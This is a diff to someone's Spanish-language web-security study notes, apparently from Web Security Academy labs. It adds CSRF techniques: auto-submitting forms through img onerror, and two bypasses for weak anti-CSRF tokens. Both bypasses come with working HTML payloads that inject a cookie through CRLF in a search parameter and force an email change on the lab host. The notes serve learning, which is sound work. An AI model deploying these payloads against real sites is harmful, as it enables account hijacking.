@@ -612,11 +612,15 @@ Es clave el metodo a usar para ejecutar en automatico acciones al ingresar y red
 <script>
   document.forms[0].submit();
 </script>
+
+<script>document.getElementById('EL').submit()</script>
 ```
 
 2. Carga de evento:
 ```html
 <body onload="document.forms[0].submit()">
+
+<img scr="https..primerpayload" onerror="document.forms[0].submit()">
 ```
 
 ### Ejemplos de ataques:
@@ -643,9 +647,34 @@ Es clave el metodo a usar para ejecutar en automatico acciones al ingresar y red
 3. CSRF de otro usuario:
    - Algunas aplicaciones no validan sí el token solo es valido para un solo usuario, entonces sí usas otro que este vivo, podria aceptar el request.
    - NOTA: Usualmente los tokens necesitan estar vivos y no haber sido usados, por lo que habra que generar tokens nuevos con otro usuario.
-4. 
+4. CSRF Token no asociado a cookie de sesión:
+   - Sí el token anticsrf no está asociado a una sesión como tal, podria ser suceptible a que nosotros inyectemos el valor de la cookie y usemos una cookie y token anticsrf vivo de otro usuario.
+   - Para el proceso debemos encontrar una forma de inyectar una cookie, luego enviar el form con el token anticsrf:
+```html
+<img src="https://0a040003045e54fc80fe5da8009d00ae.web-security-academy.net/?search=select;%0d%0aSet-Cookie:%20csrfKey=fhwsPNTQe3UQ2IVYHKgVUThQUZ73TxYZ;+SameSite=None" onerror="document.forms[0].submit()"></img>
 
+<form id="EL" action="https://0a040003045e54fc80fe5da8009d00ae.web-security-academy.net/my-account/change-email" method="POST">
+  <input type="hidden" name="email" value="aqq@cacc.com">
+  <input type="hidden" name="csrf" value="ZOjQ62csUcMyXo5bsBAbd7ARJQXvKqRC">
+</form>
+```
+5. CSRFToken validado por estar tambien en una cookie:
+   - Sí el servidor solo hace la validación del token CSRF en base a que el token sea al igual del request podria provocar que sí se tiene una función donde podamos inyectar cookies, podamos inyectar una cookie nuestra y duplicarla en el request, por ejemplo:
+```
+GET /...
+Cookie: csrfkey=222
 
+User=1&csrfkey=222
+```
+  - En base un payload similar a:
+```html
+<img src="https://a.web-security-academy.net/?search=select;%0d%0aSet-Cookie:%20csrf=I4R9vWYU4GCbDeWhAf1pEuoNx1Ou9jpm;+SameSite=None" onerror="document.forms[0].submit()"></img>
+
+<form id="EL" action="https://a.web-security-academy.net/my-account/change-email" method="POST">
+  <input type="hidden" name="email" value="aqq@cacc.com">
+  <input type="hidden" name="csrf" value="I4R9vWYU4GCbDeWhAf1pEuoNx1Ou9jpm">
+</form>
+```
 
 ## IDOR:
 Mal asignación de permisos para ver recursos que solo deberian pertenecerle a un usuario, ejemplo: /read.php?file=reporte_enero.pdf sí esté URL es accesible para todos los usuarios pero solo deberia poder verlo quien lo subio.
